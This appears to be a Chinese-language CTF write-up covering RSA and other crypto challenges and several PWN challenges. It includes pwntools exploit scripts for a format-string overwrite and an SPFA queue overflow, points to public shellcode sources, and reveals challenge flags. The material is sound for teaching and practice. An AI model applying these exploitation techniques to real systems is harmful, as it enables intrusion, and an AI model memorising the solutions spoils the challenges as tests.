### easy_RSA
比较典型的RSA套娃，分别求出p,q，利用题干中的一些函数即可求解，
p：已知$\phi(n)=(p-1)(q-1)$, $n=pq$，利用z3的solve容易求解
q：已知$ed, n=pq$，可知$ed=k(p-1)(q-1)+1$，
又由于$\frac{ed-1}{n} \leq k \leq \frac{ed-1}{2n}$
利用这个区间，循环solve即可，exp如下：
```
import sympy
from gmpy2 import invert
from Crypto.Util.number import getPrime, long_to_bytes
from z3 import *

base = 65537


def gen_prime(N):
    while 1:
        A = getPrime(N)
        if A % 4 == 3:
            break
    return A


def GET_P(n, F_n):
    p = Int('p')
    q = Int('q')
    expr = And(F_n == (p - 1) * (q - 1), n == p * q, p > 0, q > 0)
    solver = Solver()
    solver.add(expr)
    if solver.check() == sat:
        print(solver.model())
        print(solver.model().eval(p))
        print(print(solver.model().eval(q)))
        res_p = solver.model().eval(q).as_long()
        res_q = solver.model().eval(p).as_long()
    seed2 = 2021 * res_p + 2020 * res_q
    if seed2 < 0:
        seed2 = (-1) * seed2
    return sympy.nextprime(seed2)


def GET_Q(n, E_D ,judge):
    p = Int('p')
    q = Int('q')
    for k in range(judge, judge*2):
        expr = And(E_D - 1 == k * (p - 1) * (q - 1), n == p * q, p > 0, q > 0)
        solver = Solver()
        solver.add(expr)
        if solver.check() == sat:
            print(solver.model())
            print(solver.model().eval(p))
            print(print(solver.model().eval(q)))
            res_p = solver.model().eval(q).as_long()
            res_q = solver.model().eval(p).as_long()
            break
    seed2 = 2021 * res_p - 2020 * res_q
    if seed2 < 0:
        seed2 = (-1) * seed2
    return sympy.nextprime(seed2)


P_n =  14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693
P_F_n =  14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740
Q_n =  20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947
Q_E_D =  100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201
Ciphertext =  40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021


if __name__ == "__main__":
    judge = int(Q_E_D / Q_n) - 1
    _E = base
    P = GET_P(P_n, P_F_n)
    Q = GET_Q(Q_n, Q_E_D, judge)
    _D = invert(_E, (P-1)*(Q-1))
    M = pow(Ciphertext, _D, P*Q)
    flag = long_to_bytes(M)
    print(flag)
```

### real_random
利用了线性同余来构造伪随机，观察发现b,c,m满足最大周期条件，故知每次以flag[t]为种子生成的随机数列的周期均为m，通过泄露的(p-1)*(q-1)可以算出m，然后减去$2^d$（记得取模）即可求解
### 古典密码知多少
猪圈密码，圣堂武士密码，标准银河字母，且已提示都为大写字母

解密可得 `FGCPFLIRTUASYON` , 图片里也提示`fence` ，故尝试栅栏密码

每组字数为3时即可解得flag：`MRCTF{CRYPTOFUN}`

## PWN

### nothing_but_everything
本身是简单的ROP，但是我静态编译了一下后，去了符号，所以如果想看的比较轻松，需要去找找Ubuntu下的sig文件然后ida里导入，就可以复现不少函数的样子了，或者可以结合动调，总之看懂题就很简单了，直接ROPgadget一把梭。

### easy_equation
（下面说的都没用，这题忘关溢出了，直接溢出就行
很明显的格式化字符漏洞，但是在利用上需要一些技巧，首先是看到那个公式，用z3的solve很好算出来解是2，之后思路就很明确，将judge的值覆写成2即可，如果直接想要直接用fmstr_payload这种payload自动生成,会惊喜的发现，无法靠填充字符达到地址对齐，所以需要转换一下思路，考虑到地址的小端序存储，
如果在judge_addr-1的位置存入0x200，那么judge_addr的值自然会变成0x02，于是exp（不是唯一解法，也可以正向构造）如下：
```
from pwn import *
p = process('easy_equation')
judge_addr = 0x60105C

payload = 'a' * 6 + '%' + str(0x200 - 6) + 'c%10$hn'
payload += p64(judge_addr - 1)

p.sendline(payload)
p.interactive()
```

### spfa
有一个明显的get_flag函数，发现执行该函数的条件是flag!=-1，但是程序开头已经将flag赋值为-1，并且程序内并没有涉及flag的运算，于是考虑通过溢出修改flag。
查看一下bss段可以发现，flag变量在qu数组下方，相当于qu[1000]，在SPFA函数里理论可以访问并修改qu[1000]，于是需要构建特殊的图来使队列（qu数组）越界。
仔细分析可以知道，SPFA算法存在一处判断错误(if(d[y] >= d[x] + len[node]))，这使得如果路径中出现0环会发生死循环，节点不断入队，最后使队列溢出。
所以，我们所做的，只需要构造一个0环，然后求最短路。
exp：
```
from pwn import *

p = process("./spfa")

def add(a, b, c):
	p.sendlineafter(":\n", str(1))
	p.sendlineafter(":\n", str(a) + " " + str(b) + " " + str(c))

def query(a, b):
	p.sendlineafter(":\n", str(2))
	p.sendlineafter(":\n", str(a) + " " + str(b))

def get_flag():
	p.sendlineafter(":\n", str(3))


add(1, 2, 0)
add(2, 1, 0)
query(1, 2)
get_flag()

p.interactive()
```

### Shellcode

主要想考察Googlehack能力

没啥好说的
直接去
http://shell-storm.org/shellcode/
扒个x64 shellcode下来就可以了

### Shellcode Revenge

主要想考察Googlehack能力

ida可以分析出提交的Shellcode要满足全为大小写和数字的限制

可以参考这篇文章

https://hama.hatenadiary.jp/entry/2017/04/04/190129